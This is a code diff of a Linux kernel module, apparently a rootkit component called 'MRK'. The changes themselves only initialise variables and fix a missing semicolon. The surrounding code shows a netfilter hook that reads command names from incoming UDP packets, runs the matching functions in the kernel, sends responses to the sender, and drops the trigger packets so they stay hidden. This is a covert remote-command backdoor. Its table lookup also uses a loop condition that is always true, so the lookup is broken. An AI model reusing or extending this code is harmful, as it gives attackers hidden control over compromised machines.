@@ -59,11 +59,11 @@ static int send_response(
     unsigned char remote_mac[ETH_ALEN],
     struct net_device *dev
 ) {
-    struct iphdr *iph;
-    struct udphdr *udph;
-    struct ethhdr *eth;
-    struct sk_buff *skb;
-    char *data;
+    struct iphdr *iph = NULL;
+    struct udphdr *udph = NULL;
+    struct ethhdr *eth = NULL;
+    struct sk_buff *skb = NULL;
+    char *data = NULL;
     printk(KERN_INFO "returning response %d for job id %u\n", response_status, job_id);
     skb = alloc_skb(RESPONSE_DATA_LEN + RESPONSE_HEADER_LEN, GFP_ATOMIC);
     if (!skb) {
@@ -138,7 +138,7 @@ struct MRK_command_work {
 };
 
 static void handle_command(struct work_struct *work) {
-    int result;
+    int result = -1;
     struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
     result = command_work->cmd->func(command_work->arg);
     printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", command_work->cmd->name, result);
@@ -158,8 +158,8 @@ static void handle_command(struct work_struct *work) {
 }
 
 static int get_udp_user_data(struct sk_buff *skb, const char **user_data) {
-    struct udphdr *udph;
-    int user_data_len;
+    struct udphdr *udph = NULL;
+    int user_data_len = 0;
 
     udph = udp_hdr(skb);
     user_data_len = ntohs(udph->len) - sizeof(struct udphdr);
@@ -174,7 +174,7 @@ static int get_udp_user_data(struct sk_buff *skb, const char **user_data) {
 }
 
 static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
-    struct cmd_type *cmd;
+    struct cmd_type *cmd = NULL;
     for (cmd = cmds; cmd < (cmd + ARRAY_SIZE(cmds)); ++cmd) {
         if (!strcmp(buffer, cmd->name)) {
             return cmd;
@@ -184,14 +184,14 @@ static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
 }
 
 static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
-    struct iphdr *iph;
-    struct udphdr *udph;
-    const char *user_data;
-    int user_data_len;
-    short job_id;
-    struct cmd_type *cmd;
-    struct MRK_command_work *command_work;
-    char *arg;
+    struct iphdr *iph = NULL;
+    struct udphdr *udph = NULL;
+    const char *user_data = NULL;
+    int user_data_len = 0;
+    job_id_t job_id = 0;
+    struct cmd_type *cmd = NULL;
+    struct MRK_command_work *command_work = NULL;
+    char *arg = NULL;
 
     iph = ip_hdr(skb);
     if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;
@@ -218,7 +218,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     // we want the argument to be null-terminated.
     arg = kmalloc(user_data_len + 1, GFP_KERNEL);
     memcpy(arg, user_data, user_data_len);
-    arg[user_data_len] = '\0'
+    arg[user_data_len] = '\0';
     command_work->arg = arg;
     command_work->local_addr = iph->daddr;
     command_work->remote_addr = iph->saddr;
@@ -230,7 +230,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     return NF_DROP;
 }
 
-struct nf_hook_ops *net_hook;
+struct nf_hook_ops *net_hook = NULL;
 
 int MRK_init_nethook(void) {
     net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
